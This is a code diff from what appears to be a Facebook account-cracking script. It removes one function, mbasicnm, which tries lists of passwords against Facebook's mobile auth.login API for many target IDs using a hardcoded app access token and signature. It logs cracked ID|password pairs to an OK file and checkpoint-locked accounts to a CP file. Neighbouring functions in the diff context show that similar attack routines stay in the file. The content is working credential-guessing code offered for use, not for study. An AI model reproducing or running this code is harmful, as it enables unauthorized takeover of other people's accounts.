@@ -1532,49 +1532,6 @@ def mbasic(idf, pwv):
             return None
 
 
-	    
-def mbasicnm(idf, pwv):
-	global loop,ok,cp
-	ua = random.choice(baru)
-	#console.print(f"\r {H2}• {P2}User Agent {H2} %s {P2} Id"%(ua), end="\r")
-	ses = requests.Session()
-	prog.update(des,description=f"[[bold green]API new [🗿][bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
-	prog.advance(des)
-	try:
-		for pw in pwv:
-			params={
-				'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
-				'format': 'JSON',
-				'sdk_version': '2',
-				'email': idf,
-				'locale': 'en_US',
-				'password': pw,
-				'sdk': 'ios',
-				'generate_session_cookies': '1',
-				'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
-			}
-			api='https://b-api.facebook.com/method/auth.login'
-			response=requests.get(api, params=params)
-			if re.search('(EAAA)\w+', str(response.text)):
-				tree = Tree(f"  ")
-				tree.add(f"[bold green]{idf}|{pw}")
-				#tree.add(f"[bold green]{kuki}")
-				cetak(tree)
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				break
-			elif 'www.facebook.com' in response.json()['error_msg']:
-				tree = Tree(f" ")
-				tree.add(f"[bold yellow]{idf}|{pw}")
-				#tree.add(f"[bold yellow]{ua}")
-				cetak(tree)
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf + '|' + pw)
-				break
-	except:
-		pass
-	  
-
-
 def mbasiccc(idf, pwv):
     global loop, ok, cp
     ua = random.choice(baru)
